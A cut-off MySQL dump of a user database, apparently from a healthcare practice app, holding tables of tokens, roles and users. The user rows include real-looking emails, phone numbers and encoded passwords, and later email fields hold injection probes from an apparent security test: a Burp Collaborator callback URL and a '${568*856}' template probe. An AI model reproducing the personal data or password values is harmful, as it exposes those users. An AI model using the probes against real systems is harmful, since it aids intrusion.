/*
SQLyog Ultimate v11.11 (32 bit)
MySQL - 5.6.27-log : Database - userdb
*********************************************************************
*/

/*!40101 SET NAMES utf8 */;

/*!40101 SET SQL_MODE=''*/;

/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
CREATE DATABASE /*!32312 IF NOT EXISTS*/`userdb` /*!40100 DEFAULT CHARACTER SET latin1 */;

USE `userdb`;

/*Table structure for table `dt_tokens` */

DROP TABLE IF EXISTS `dt_tokens`;

CREATE TABLE `dt_tokens` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `acess_key` varchar(200) DEFAULT NULL,
  `secret_key` varchar(200) DEFAULT NULL,
  `user_id` bigint(20) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*Data for the table `dt_tokens` */

/*Table structure for table `dt_user_details` */

DROP TABLE IF EXISTS `dt_user_details`;

CREATE TABLE `dt_user_details` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) DEFAULT NULL,
  `org_id` bigint(20) DEFAULT NULL,
  `department_id` bigint(20) DEFAULT NULL,
  `patient_id` bigint(20) DEFAULT NULL,
  `speciality` varchar(200) DEFAULT NULL,
  `dob` date DEFAULT NULL,
  `age` varchar(3) DEFAULT NULL,
  `blood_group` varchar(3) DEFAULT NULL,
  `gender` enum('M','F') DEFAULT NULL,
  `height` varchar(6) DEFAULT NULL,
  `weight` varchar(6) DEFAULT NULL,
  `address` text,
  `state_id` int(11) DEFAULT NULL,
  `city_id` int(11) DEFAULT NULL,
  `country_id` int(11) DEFAULT NULL,
  `zip_code` varchar(10) DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB DEFAULT CHARSET=latin1;

/*Data for the table `dt_user_details` */

/*Table structure for table `dt_user_roles` */

DROP TABLE IF EXISTS `dt_user_roles`;

CREATE TABLE `dt_user_roles` (
  `id` bigint(20) unsigned NOT NULL AUTO_INCREMENT,
  `user_id` bigint(20) DEFAULT NULL,
  `role_id` int(11) DEFAULT NULL,
  `createdat` datetime DEFAULT NULL,
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=235 DEFAULT CHARSET=latin1;

/*Data for the table `dt_user_roles` */

insert  into `dt_user_roles`(`id`,`user_id`,`role_id`,`createdat`) values (10,1,1,NULL),(11,2,1,NULL),(12,3,1,NULL),(13,4,1,NULL),(14,5,1,NULL),(15,1,1,NULL),(16,2,1,NULL),(17,3,1,NULL),(18,4,1,NULL),(19,5,1,NULL),(20,6,1,NULL),(22,8,1,NULL),(23,9,1,NULL),(24,10,1,NULL),(25,11,1,NULL),(26,12,1,NULL),(27,13,1,NULL),(28,14,1,NULL),(29,15,1,NULL),(30,16,1,NULL),(31,17,1,NULL),(32,18,1,NULL),(33,19,1,NULL),(34,20,1,NULL),(35,21,1,NULL),(36,22,1,NULL),(37,23,1,NULL),(38,24,1,NULL),(39,25,1,NULL),(40,26,1,NULL),(41,27,1,NULL),(42,28,1,NULL),(43,29,1,NULL),(44,30,1,NULL),(45,31,1,NULL),(46,32,1,NULL),(47,33,1,NULL),(48,34,1,NULL),(49,35,1,NULL),(50,36,1,NULL),(51,37,1,NULL),(52,38,1,NULL),(53,39,1,NULL),(54,40,1,NULL),(55,41,1,NULL),(56,41,1,NULL),(57,42,1,NULL),(58,43,1,NULL),(59,44,1,NULL),(60,45,1,NULL),(61,46,1,NULL),(62,47,1,NULL),(63,43,1,NULL),(64,44,1,NULL),(65,45,1,NULL),(66,46,1,NULL),(67,47,1,NULL),(68,48,1,NULL),(69,49,1,NULL),(70,50,1,NULL),(71,51,1,NULL),(72,52,1,NULL),(73,53,1,NULL),(74,54,1,NULL),(75,55,1,NULL),(76,56,1,NULL),(77,57,1,NULL),(78,58,1,NULL),(79,59,1,NULL),(80,60,1,NULL),(81,61,1,NULL),(82,62,1,NULL),(83,63,1,NULL),(84,64,1,NULL),(85,65,1,NULL),(86,66,1,NULL),(87,67,1,NULL),(88,68,1,NULL),(89,69,1,NULL),(90,70,1,NULL),(91,71,1,NULL),(92,72,1,NULL),(93,73,1,NULL),(94,74,1,NULL),(95,75,1,NULL),(96,76,1,NULL),(97,77,1,NULL),(98,78,1,NULL),(99,79,1,NULL),(100,80,1,NULL),(101,81,1,NULL),(102,82,1,NULL),(103,83,1,NULL),(104,84,1,NULL),(105,85,1,NULL),(106,86,1,NULL),(107,87,1,NULL),(108,88,1,NULL),(109,89,1,NULL),(110,90,1,NULL),(111,91,1,NULL),(112,92,1,NULL),(113,93,1,NULL),(114,94,1,NULL),(115,95,1,NULL),(116,96,1,NULL),(117,97,1,NULL),(118,98,1,NULL),(119,99,1,NULL),(120,100,1,NULL),(121,101,1,NULL),(122,105,1,NULL),(123,106,1,NULL),(124,107,1,NULL),(125,108,1,NULL),(126,109,1,NULL),(127,110,1,NULL),(128,111,1,NULL),(129,112,1,NULL),(130,113,1,NULL),(131,114,1,NULL),(132,116,1,NULL),(133,117,1,NULL),(134,118,1,NULL),(135,119,1,NULL),(136,121,1,NULL),(137,122,1,NULL),(138,123,1,NULL),(139,124,1,NULL),(140,125,1,NULL),(141,126,1,NULL),(142,127,1,NULL),(143,128,1,NULL),(144,129,1,NULL),(145,130,1,NULL),(146,131,1,NULL),(147,132,1,NULL),(148,133,1,NULL),(149,134,1,NULL),(150,135,1,NULL),(151,136,1,NULL),(152,137,1,NULL),(153,138,1,NULL),(154,139,1,NULL),(155,140,1,NULL),(156,141,1,NULL),(157,142,1,NULL),(158,143,1,NULL),(159,144,1,NULL),(160,145,1,NULL),(161,146,1,NULL),(162,147,1,NULL),(163,148,1,NULL),(164,149,1,NULL),(165,150,1,NULL),(166,151,1,NULL),(167,152,1,NULL),(168,153,1,NULL),(169,154,1,NULL),(170,155,1,NULL),(171,156,1,NULL),(172,157,1,NULL),(173,158,1,NULL),(174,159,1,NULL),(175,160,1,NULL),(176,161,1,NULL),(177,162,1,NULL),(178,163,1,NULL),(179,164,1,NULL),(180,165,1,NULL),(181,166,1,NULL),(182,167,1,NULL),(183,168,1,NULL),(184,169,1,NULL),(185,170,1,NULL),(186,171,1,NULL),(187,172,1,NULL),(188,173,1,NULL),(189,174,1,NULL),(190,175,1,NULL),(191,176,1,NULL),(192,177,1,NULL),(193,178,1,NULL),(194,179,1,NULL),(195,180,1,NULL),(196,181,1,NULL),(197,182,1,NULL),(198,183,1,NULL),(199,184,1,NULL),(200,185,1,NULL),(201,186,1,NULL),(202,187,1,NULL),(203,188,1,NULL),(204,189,1,NULL),(205,190,1,NULL),(206,191,1,NULL),(207,192,1,NULL),(208,193,1,NULL),(209,194,1,NULL),(210,195,1,NULL),(211,196,1,NULL),(212,197,1,NULL),(213,198,1,NULL),(214,199,1,NULL),(215,200,1,NULL),(216,201,1,NULL),(217,202,1,NULL),(218,203,1,NULL),(219,204,1,NULL),(220,205,1,NULL),(221,206,1,NULL),(222,207,1,NULL),(223,208,1,NULL),(224,209,1,NULL),(225,210,1,NULL),(226,211,1,NULL),(227,212,1,NULL),(228,213,1,NULL),(229,214,1,NULL),(230,215,1,NULL),(231,216,1,NULL),(232,217,1,NULL),(233,218,1,NULL),(234,219,1,NULL);

/*Table structure for table `dt_users` */

DROP TABLE IF EXISTS `dt_users`;

CREATE TABLE `dt_users` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `email` varchar(255) DEFAULT NULL,
  `password` varchar(255) DEFAULT NULL,
  `phone` varchar(255) DEFAULT NULL,
  `status` enum('Y','N') DEFAULT 'N',
  `full_name` varchar(255) DEFAULT NULL,
  `pratice_name` varchar(255) DEFAULT NULL,
  `orgid` int(11) NOT NULL,
  `user_type` enum('A','U') DEFAULT 'A',
  `createDate` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP,
  `updateDate` timestamp NOT NULL DEFAULT '0000-00-00 00:00:00',
  PRIMARY KEY (`id`)
) ENGINE=InnoDB AUTO_INCREMENT=220 DEFAULT CHARSET=latin1;

/*Data for the table `dt_users` */

insert  into `dt_users`(`id`,`email`,`password`,`phone`,`status`,`full_name`,`pratice_name`,`orgid`,`user_type`,`createDate`,`updateDate`) values (4,'Thomas@quantifiedcare.com','R1RtmXxn7HW6ozzx4zi9Fg==\r\n','4432225555','N','Jon Paxson','Chicago Bullz',21,'A','2017-03-19 18:20:42','2017-06-17 13:39:18'),(40,'t.laxminarsimha@gmail.com','kQFswcO8AF41jX5kWJI7eA==\r\n','9676719422','Y','Lakshmi','Nursing Care',10,'A','2017-04-24 02:07:42','2017-04-24 02:07:42'),(41,'rahul.thapan@corparete.com','TiE7kmGWFByxm4HBvKRKqQ==\r\n','00000000','Y','Rahul Thapan','CorpArete Clinic',11,'A','2017-04-25 04:19:50','2017-04-25 04:19:50'),(44,'securitytesting+QCEngage@axl.net','N0Ae6UwEs9+VsutmKCcDBw==\r\n','8123204094','Y','Sumit2','LifeMed Pharma',21,'U','2017-04-28 14:01:30','2017-06-02 13:26:44'),(45,'lifemed@yopmail.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','1118681111','Y','Sumit Devgan','LifeMed Pharmaceutical',19,'A','2017-04-28 14:01:30','2017-08-15 05:12:18'),(46,'krishnaerb@gmail.com','+RTn3SIiaN6S+zJFPXfLAw==\r\n','00000000','Y','Krishna','Test',20,'A','2017-05-02 06:15:06','2017-05-02 06:15:06'),(48,'devgans@yopmail.com','+Rd1jqF9DQWrjAxRTCdYgmgt04vZOltxYivLrSRQYes=\r\n','8908908098','Y','AD','LifeMed Pharma',19,'A','2017-05-08 11:01:11','2017-05-08 11:01:11'),(49,'devgan@yopmail.com','jofSlkhM/a1YFZ8d9gsu9Ggt04vZOltxYivLrSRQYes=\r\n','8908908098','Y','AD','LifeMed Pharma',19,'A','2017-05-08 11:01:11','2017-05-08 11:01:11'),(50,'De','MCwyXaVociX0tTVzF1ntDWgt04vZOltxYivLrSRQYes=\r\n','6666666666','Y','Sam','LifeMed Pharma',19,'A','2017-05-08 11:03:19','2017-05-08 11:03:19'),(51,'lifemed1@yopmail.com','N0Ae6UwEs9+VsutmKCcDBw==','9232323232','Y','Alababa','LifeMed Pharmaceutical',19,'A','2017-05-08 12:00:30','2017-05-08 12:00:30'),(52,'8979789789897','Vvu5Rzbk6DrS0m6kuOlfDGgt04vZOltxYivLrSRQYes=\r\n','0000000000','Y','Junk User','LifeMed Pharmaceutical',19,'U','2017-05-08 12:01:16','2017-05-08 12:01:16'),(53,'Blah-blah','EzY4HXxwXD+cGtRCmUI7p2gt04vZOltxYivLrSRQYes=\r\n','0000000000','Y','Blah','LifeMed Pharmaceutical',19,'U','2017-05-08 12:01:16','2017-05-08 12:01:16'),(54,'heeelo','K5DOI4OP9jEa5o40nyw4FWgt04vZOltxYivLrSRQYes=\r\n','1234324423','Y','heelo','LifeMed Pharmaceutical',19,'A','2017-05-15 16:19:55','2017-05-15 16:19:55'),(55,'duhqwoih','utroKQ/j+wA1C8/C9xohgWgt04vZOltxYivLrSRQYes=\r\n','8277282828','Y','Hello','LifeMed Pharmaceutical',19,'A','2017-05-15 19:42:39','2017-05-15 19:42:39'),(56,'mr.anupamroy@gmail.com','WQdkDmyDsPGUzNc+EhUFh2gt04vZOltxYivLrSRQYes=\r\n','4314656465','Y','namaha','LifeMed Pharmaceutical',19,'U','2017-05-16 05:28:23','2017-05-16 05:28:23'),(57,'asm12@gmail.com','2Btz1blcZA3E59lbxG3b7mgt04vZOltxYivLrSRQYes=\r\n','42.3542311','Y','sd12','LifeMed Pharmaceutical',19,'U','2017-05-16 05:28:23','2017-05-16 05:28:23'),(58,'abc','a61J2TljNk7CQs7y5p0ujGgt04vZOltxYivLrSRQYes=\r\n','68.65.555.','Y','fdsa','LifeMed Pharmaceutical',19,'A','2017-05-16 05:36:39','2017-05-16 05:36:39'),(59,'abc@gmail.com','teKXlaP2UlAsItwsdjsSnGgt04vZOltxYivLrSRQYes=\r\n','68.65.555.','Y','fdsa','LifeMed Pharmaceutical',19,'A','2017-05-16 05:36:39','2017-05-16 05:36:39'),(60,'safa','px8nPK/WClVS1p9B59MkcGgt04vZOltxYivLrSRQYes=\r\n','45.55.555.','Y','fasa','LifeMed Pharmaceutical',19,'A','2017-05-16 05:52:42','2017-05-16 05:52:42'),(61,'asas','mc3ichYSW7rBpOyBvr1bc2gt04vZOltxYivLrSRQYes=\r\n','9.55.2555.','Y','asdf','LifeMed Pharmaceutical',19,'U','2017-05-16 05:56:20','2017-05-16 05:56:20'),(62,'ab','FVMdmd0xu2TYbPbBzyXTy2gt04vZOltxYivLrSRQYes=\r\n','9.55.2555.','Y','asdf','LifeMed Pharmaceutical',19,'U','2017-05-16 05:56:20','2017-05-16 05:56:20'),(63,'dsa','W5azAY+HhtH+VEL5mR4hp2gt04vZOltxYivLrSRQYes=\r\n','7878788789','Y','qwa','LifeMed Pharmaceutical',19,'A','2017-05-16 05:59:54','2017-05-16 05:59:54'),(64,'i','PPPbAUgA7sE4dykULfYh/mgt04vZOltxYivLrSRQYes=\r\n','9.998.879.','Y','yui','LifeMed Pharmaceutical',19,'A','2017-05-16 06:25:49','2017-05-16 06:25:49'),(65,'q','svUDGulLddND7h8HDl2DGGgt04vZOltxYivLrSRQYes=\r\n','5.55.55.55','Y','poi','LifeMed Pharmaceutical',19,'A','2017-05-16 07:40:56','2017-05-16 07:40:56'),(66,'oiu@gmail.com','blvnAVDafYzcnh6Dd+9eqmgt04vZOltxYivLrSRQYes=\r\n','5.55.55.55','Y','poi','LifeMed Pharmaceutical',19,'A','2017-05-16 07:40:56','2017-05-16 07:40:56'),(67,'qw12@gmail.com','L60YlAARXyqotyFyUxNVsGgt04vZOltxYivLrSRQYes=\r\n','33.3.53333','Y','q','LifeMed Pharmaceutical',19,'U','2017-05-16 07:40:56','2017-05-16 07:40:56'),(68,'rt12@gmail.com','YXrEX+q4gpzU2UtbKvVSYWgt04vZOltxYivLrSRQYes=\r\n','1.22.23.33','Y','r','LifeMed Pharmaceutical',19,'U','2017-05-16 07:48:29','2017-05-16 07:48:29'),(69,'kjfhiew','FoCaEzoIKWnYBqEppTbzhWgt04vZOltxYivLrSRQYes=\r\n','12.4.31.33','Y','krishna','LifeMed Pharmaceutical',19,'A','2017-05-16 09:24:13','2017-05-16 09:24:13'),(70,'s','KiBjU2ZGDRFP8BOWV7gG/Ggt04vZOltxYivLrSRQYes=\r\n','5.25555.55','Y','sas','LifeMed Pharmaceutical',19,'A','2017-05-16 09:46:19','2017-05-16 09:46:19'),(71,'datadasds@test.com','EjfLgLxv1IrhLaXA9B/pEmgt04vZOltxYivLrSRQYes=\r\n','9177297024','Y','Lakshmi','Nursing Care',10,'U','2017-05-16 13:31:45','2017-05-16 13:31:45'),(72,'testmail@mail.com','ubyhv805t/qZDVc6tjVXlmgt04vZOltxYivLrSRQYes=\r\n','8886433668','Y','Laks','Nursing Care',10,'U','2017-05-16 13:37:23','2017-05-16 13:37:23'),(73,'krishna@gmail.com','0ZdsxoyaKYtG3tozg5iUW2gt04vZOltxYivLrSRQYes=\r\n','8688688668','Y','Krishna','LifeMed Pharmaceutical',19,'A','2017-05-16 13:44:48','2017-05-16 13:44:48'),(74,'raju123@gmail.com','5iYhsSG0tTXgbtPh4trmUmgt04vZOltxYivLrSRQYes=\r\n','9849844694','Y','qwqw','LifeMed Pharmaceutical',19,'U','2017-05-16 13:45:56','2017-05-16 13:45:56'),(75,'nikhil@gmail.com','iB+r5BFCHfuvOj3rNDSYrGgt04vZOltxYivLrSRQYes=\r\n','1231323233','Y','nikhil','LifeMed Pharmaceutical',19,'A','2017-05-16 13:46:54','2017-05-16 13:46:54'),(76,'Zxcv12@gmail.com','Dp66LFVGduHGfXiug76y6Ggt04vZOltxYivLrSRQYes=\r\n','54646556.5','Y','Zxcv','LifeMed Pharmaceutical',19,'U','2017-05-16 13:45:56','2017-05-16 13:45:56'),(77,'KRishna2342@gmail.com','gGAgx4Ry9qwEKjzrMG5JSGgt04vZOltxYivLrSRQYes=\r\n','1233123233','Y','Krishna','LifeMed Pharmaceutical',19,'A','2017-05-16 13:46:54','2017-05-16 13:46:54'),(78,'Nikhil12@gmail.com','yCS0Q13LeLM/Wm2UdXKlnGgt04vZOltxYivLrSRQYes=\r\n','4.54.66.55','Y','nik','LifeMed Pharmaceutical',19,'A','2017-05-16 17:26:38','2017-05-16 17:26:38'),(79,'gopip@mindtechlabs.com','kPskuomov2akUwIw3ny+B2gt04vZOltxYivLrSRQYes=\r\n','2.33.331.3','Y','gfdgdgg','LifeMed Pharmaceutical',19,'A','2017-05-16 17:43:58','2017-05-16 17:43:58'),(80,'gasg@jsd.com','CAToxaNS4Mvz4WV0n/YX8mgt04vZOltxYivLrSRQYes=\r\n','9177297024','Y','sf','LifeMed Pharmaceutical',19,'U','2017-05-16 18:30:23','2017-05-16 18:30:23'),(81,'as12@gmail.com','j4WpNgY0KxeQPRLunKq6jGgt04vZOltxYivLrSRQYes=\r\n','5.66566.66','Y','asas','LifeMed Pharmaceutical',19,'A','2017-05-16 19:39:40','2017-05-16 19:39:40'),(82,'xxxxx@gmail.com','V28wBeiZBpPtucuzJqy7TGgt04vZOltxYivLrSRQYes=\r\n','2122212212','Y','xxxxxx','LifeMed Pharmaceutical',19,'A','2017-05-16 20:01:02','2017-05-16 20:01:02'),(83,'krishn@gmail.com','LLy22/7Rs0kDWDCLGhUKamgt04vZOltxYivLrSRQYes=\r\n','2414144144','Y','mdjidjd','LifeMed Pharmaceutical',19,'A','2017-05-16 20:02:14','2017-05-16 20:02:14'),(84,'xxxx443@gmail.com','NQj9QUn0hK98RqoIXwK2OWgt04vZOltxYivLrSRQYes=\r\n','4644644656','Y','a','LifeMed Pharmaceutical',19,'U','2017-05-17 04:34:30','2017-05-17 04:34:30'),(85,'asa12@gmail.com','crBxjQNWlkkM9nh92s5fn2gt04vZOltxYivLrSRQYes=\r\n','79.9799798','Y','sas','LifeMed Pharmaceutical',19,'U','2017-05-17 04:36:29','2017-05-17 04:36:29'),(86,'fdf@ggg.com','hbj07JqCVyYCSN+4+22FHGgt04vZOltxYivLrSRQYes=\r\n','1.11111111','Y','dfdf','LifeMed Pharmaceutical',19,'U','2017-05-17 05:44:32','2017-05-17 05:44:32'),(87,'rajesh@gmail.com','+piXQKIgBwpgzM5GqMYmamgt04vZOltxYivLrSRQYes=\r\n','1.2222222.','Y','Rajesh','LifeMed Pharmaceutical',19,'U','2017-05-17 05:44:32','2017-05-17 05:44:32'),(88,'aaa@aaa.com','NKL6PNOwWog94xwMnjWIKWgt04vZOltxYivLrSRQYes=\r\n','4455544445','Y','gfs','LifeMed Pharmaceutical',19,'U','2017-05-17 05:44:32','2017-05-17 05:44:32'),(89,'rajeswwh@gmail.com','Zdn5DCp36mgh6FziB09gKmgt04vZOltxYivLrSRQYes=\r\n','1111111111','Y','rajesh','LifeMed Pharmaceutical',19,'U','2017-05-17 05:44:32','2017-05-17 05:44:32'),(90,'kri@gmail.com','3f1Y27XGSB0uPtUvuupkGGgt04vZOltxYivLrSRQYes=\r\n','1.222.1.22','Y','kri','LifeMed Pharmaceutical',19,'A','2017-05-17 05:51:25','2017-05-17 05:51:25'),(91,'dsdjsh@sdsd.com','oC1/d7YhgV/p6Db9Z+K5kWgt04vZOltxYivLrSRQYes=\r\n','23223.2323','Y','mb,,','LifeMed Pharmaceutical',19,'U','2017-05-17 06:00:28','2017-05-17 06:00:28'),(92,'fghfg@dfd.com','OmFwlg/lzNt6ISlpsZ0vBmgt04vZOltxYivLrSRQYes=\r\n','41.4577757','Y','hdgfhgf','LifeMed Pharmaceutical',19,'A','2017-05-17 06:07:55','2017-05-17 06:07:55'),(93,'sadf@dgd.com','/1+9h0gRnwBpZapAOoAg6mgt04vZOltxYivLrSRQYes=\r\n','2.11112121','Y','sasfsdfdsf','LifeMed Pharmaceutical',19,'A','2017-05-17 06:20:24','2017-05-17 06:20:24'),(94,'','rJIiP2cjBf1NTq3jbpcZ9Wgt04vZOltxYivLrSRQYes=\r\n','1.21.2','Y','','LifeMed Pharmaceutical',19,'A','2017-05-17 06:52:51','2017-05-17 06:52:51'),(95,'abc32@gmail.com','zANCqUpNJQMDQ4Y/I7dM62gt04vZOltxYivLrSRQYes=\r\n','5.55.55.22','Y','a','LifeMed Pharmaceutical',19,'A','2017-05-17 07:07:04','2017-05-17 07:07:04'),(96,'dada@gmail.com','T1eT4PU9IJlrSRgxyxsTxGgt04vZOltxYivLrSRQYes=\r\n','8686879646','Y','nikhil dada','LifeMed Pharmaceutical',19,'A','2017-05-17 14:33:42','2017-05-17 14:33:42'),(97,'fhasdfg12@gmail.com','JK9XRJ4Qrqq+JVSTd5pcEmgt04vZOltxYivLrSRQYes=\r\n','1211122121','Y','qwegjq','LifeMed Pharmaceutical',19,'U','2017-05-18 06:25:51','2017-05-18 06:25:51'),(98,'sdfdsf@gmail.cm','3Aw9n4nyiyDHYp6rCt9aSmgt04vZOltxYivLrSRQYes=\r\n','7895343453','Y','sdfdsf','LifeMed Pharmaceutical',19,'U','2017-05-19 14:51:43','2017-05-19 14:51:43'),(99,'nik@122.gmail.com','gwbnzXf1rv59XMonFHDFW2gt04vZOltxYivLrSRQYes=\r\n','3433434434','Y','qwe','LifeMed Pharmaceutical',19,'A','2017-05-19 14:52:36','2017-05-19 14:52:36'),(100,'sverma@yopmail.com','T8y1C41oI7vXVEC2+WA5vmgt04vZOltxYivLrSRQYes=\r\n','5716565765','Y','Satyam','LifeMed Pharma',18,'A','2017-05-19 18:18:27','2017-05-19 18:18:27'),(101,'pra@gmail.com','L9wIFR+CqQoDVKM4gjiIfWgt04vZOltxYivLrSRQYes=\r\n','8888888888','Y','Prasad','LifeMed Pharmaceutical',19,'A','2017-05-25 10:38:34','2017-05-25 10:38:34'),(102,'sverma@quantifiedcare.com','R1RtmXxn7HW6ozzx4zi9Fg==\r\n','00000000','N','Satyam Verma','Tom\'s Practice',21,'A','2017-03-19 18:20:42','2017-03-19 18:20:42'),(104,'sumit@quantifiedcare.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','1000000014','N','Sumit Devgan','Tom\'s Practice',21,'A','2017-03-19 18:20:42','2017-03-19 18:20:42'),(105,'nikhils12@gmail.com','BNJWr4s1UoMxTGSxXGgO4Ggt04vZOltxYivLrSRQYes=\r\n','9491879239','Y','Nikhil','LifeMed Pharmaceutical',19,'A','2017-05-29 08:25:47','2017-05-29 08:25:47'),(106,'nikhil.saggam@mindtechlabs.com','X2KoD38rtO6BJNBc7X8Ns2gt04vZOltxYivLrSRQYes=\r\n','9876454654','Y','QWE','LifeMed Pharmaceutical',19,'A','2017-05-29 08:30:05','2017-05-29 08:30:05'),(107,'Nikhil.saggam12@gmail.com','gMMuSsb9Hx13Heg10FkQK2gt04vZOltxYivLrSRQYes=\r\n','7971256552','Y','QWE','LifeMed Pharmaceutical',19,'A','2017-05-29 08:33:27','2017-05-29 08:33:27'),(108,'alia@yopmail.com','i2pBRH50YzXmMlj97Y1BQmgt04vZOltxYivLrSRQYes=\r\n','2222220111','Y','Aalia','LifeMed Pharmaceutical',19,'U','2017-05-31 08:43:10','2017-05-31 08:43:10'),(109,'vcxvcxvvxcvxcvv@csdf.ghfgh','lJO0zQlzD4d2xLsdjwrWb2gt04vZOltxYivLrSRQYes=\r\n','7702018008','Y','vcxvxcx','LifeMed Pharmaceutical',19,'A','2017-06-09 09:59:20','2017-06-09 09:59:20'),(110,'gopip007@mindtechlabs.com','NiuksepMzUHuuA+A+DHge2gt04vZOltxYivLrSRQYes=\r\n','7702018008','Y','gopi panguluri','LifeMed Pharmaceutical',19,'A','2017-06-10 06:09:48','2017-06-10 06:09:48'),(111,'gopip548@gmail.com','SbNI20az2b3yNLjz2uslWWgt04vZOltxYivLrSRQYes=\r\n','7702018008','Y','Gopip548','LifeMed Pharmaceutical',19,'A','2017-06-10 06:16:25','2017-06-10 06:16:25'),(112,'gopipppp548@gmail.com','RgU++UcojzyVHdnDOVJ9b2gt04vZOltxYivLrSRQYes=\r\n','7702018008','Y','gopipppp548','LifeMed Pharmaceutical',19,'A','2017-06-10 06:17:13','2017-06-10 06:17:13'),(113,'aa@yopmail.com','0uC2rWyj0rwMzxzrFjRs+2gt04vZOltxYivLrSRQYes=\r\n','9990000000','Y','Aayushi','LifeMed Pharmaceutical',19,'A','2017-06-16 06:09:44','2017-06-16 06:09:44'),(114,'a@yuo.com','AhRWtwHmJR6VviM1B+vRrGgt04vZOltxYivLrSRQYes=\r\n','1112222222','Y','A','LifeMed Pharmaceutical',19,'A','2017-06-16 06:11:13','2017-06-16 06:11:13'),(115,'sumitdevgan@quantifiedcare.com','R1RtmXxn7HW6ozzx4zi9Fg==\r\n','4432225555','N','Sumit Devgan','Chicago Bulls',23,'A','2017-03-19 18:20:42','2017-06-01 17:39:22'),(116,'sd@u.com','e8mzsAHQgQWmt/tL8n29Omgt04vZOltxYivLrSRQYes=\r\n','2362365217','Y','SD','LifeMed Pharmaceutical',19,'A','2017-06-16 09:10:59','2017-06-16 09:10:59'),(117,'mm@mm.com','XB5tXlOIWCDwMZzm5Ui8CWgt04vZOltxYivLrSRQYes=\r\n','9999999999','Y','mmm','LifeMed Pharmaceutical',19,'A','2017-06-22 02:33:52','2017-06-22 02:33:52'),(118,'mm@mm1.com','VvTI01Du0khMnOgVx4jAy2gt04vZOltxYivLrSRQYes=\r\n','9966603576','Y','ZX','LifeMed Pharmaceutical',19,'A','2017-06-22 02:35:25','2017-06-22 02:35:25'),(119,'asas@aa.com','kPHNwEFyZW7OlcHcOV6Tcmgt04vZOltxYivLrSRQYes=\r\n','9966603576','Y','asa','LifeMed Pharmaceutical',19,'A','2017-06-22 06:02:43','2017-06-22 06:02:43'),(120,'mr.anupamroy@gmail.com','N0Ae6UwEs9+VsutmKCcDBw==\r\n','','Y','Anupam Roy','Apollo',12,'A','2017-04-28 14:01:30','0000-00-00 00:00:00'),(121,'test@test.com','JiQlbm/7VerT1VS2sqBXzGgt04vZOltxYivLrSRQYes=\r\n','9990000000','Y','test member','LifeMed Pharmaceutical',19,'U','2017-06-27 09:02:34','2017-06-27 09:02:34'),(122,'sd@yopmail.com','904HhnfjdNipB9nGL5a/KWgt04vZOltxYivLrSRQYes=\r\n','2220000000','Y','SD','LifeMed Pharmaceutical',19,'A','2017-06-29 15:09:21','2017-06-29 15:09:21'),(123,'sd1@yopmail.com','eBjU81MU6N5Gaf+lf0Cw/mgt04vZOltxYivLrSRQYes=\r\n','2220000000','Y','SD','LifeMed Pharmaceutical',19,'A','2017-06-29 15:12:46','2017-06-29 15:12:46'),(124,'testmail@gmail.com','Mu2QPsxAiMzchKxbYJuteWgt04vZOltxYivLrSRQYes=\r\n','2334342434','Y','Hello','LifeMed Pharmaceutical',19,'A','2017-06-30 05:04:26','2017-06-30 05:04:26'),(125,'nikkrish12@gmail.cm','4Rn3O4sjJtl2y6dXcqcdYWgt04vZOltxYivLrSRQYes=\r\n','4978989879','Y','nikkrish','LifeMed Pharmaceutical',19,'U','2017-06-30 05:08:02','2017-06-30 05:08:02'),(126,'nikhil123@gmail.com','LQnEYXE9te24ejjz1s6bp2gt04vZOltxYivLrSRQYes=\r\n','41645654.5','Y','nikkrish12','LifeMed Pharmaceutical',19,'A','2017-06-30 05:43:45','2017-06-30 05:43:45'),(127,'krishna.eraboina@mindtechlabs.com','k+JEUt9vd0gpHPBtVcDcRw==\r\n','00000000','Y','Tester ','Test',24,'A','2017-07-01 00:24:30','2017-07-01 00:24:30'),(128,'mab@yopmail.com','VrGRwhsuy+b5nwyXwnekRGgt04vZOltxYivLrSRQYes=\r\n','1000000000','Y','Mike Batista','Tom\'s Practice',21,'U','2017-07-01 22:53:44','2017-07-01 22:53:44'),(129,'securitytesting+QCEngage2@axl.net','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',25,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(130,'securitytesting+QCEngage3@axl.net','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',26,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(131,'k1knyxqckv','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',27,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(132,'securitytesting@axl.net','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',28,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(133,'securitytesting+QCEngage2@axl.netrw4uh611qu','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',29,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(134,'http://f4kx0z4lfag5vezdo25lt0owonuep2fq7d01p.burpcollaborator.net?securitytesting+QCEngage2@axl.net','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',30,'A','2017-07-13 03:22:06','2017-07-13 03:22:06'),(135,'npwvx${568*856}f9pq9','yk7DUiDPr0dz4O9dRA67gA==\r\n','00000000','Y','Dr Foley','Dr. Office',31,'A','2017-07-13 03:22:06','2017-07-13 